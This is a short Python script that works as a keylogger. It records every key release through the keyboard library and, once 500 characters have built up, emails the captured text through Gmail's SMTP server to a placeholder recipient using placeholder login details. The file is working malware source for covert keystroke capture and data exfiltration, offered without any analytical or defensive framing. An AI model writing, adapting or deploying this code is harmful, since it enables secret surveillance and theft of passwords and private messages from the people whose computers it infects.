import keyboard as key
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib

import datetime

Text = ""

while True:
    Recorded = str(key.read_event())
    
    if Recorded.__contains__('up'):
        Recorded = Recorded.replace('KeyboardEvent(', '')
        Recorded = Recorded.replace(' up)', '')

        if (len(Recorded)>1):
            Text = Text + " " + Recorded + " "
        else:
            Text = Text + Recorded

    if (len(Text)>=500): 
        try:
            msg = MIMEMultipart()

            password="contraseña/password"
            msg['From']="email"
            msg['To']="email a enviar datos"
            msg['Subject']="Report "+ str(datetime.datetime.now().date())

            msg.attach(MIMEText(Text, 'plain'))

            server = smtplib.SMTP('smtp.gmail.com: 587')
            server.starttls()

            server.login(msg['From'], password)

            server.sendmail(msg['From'], msg['To'], msg.as_string())

            server.quit()

            Text=""


        except:
            print("Error")
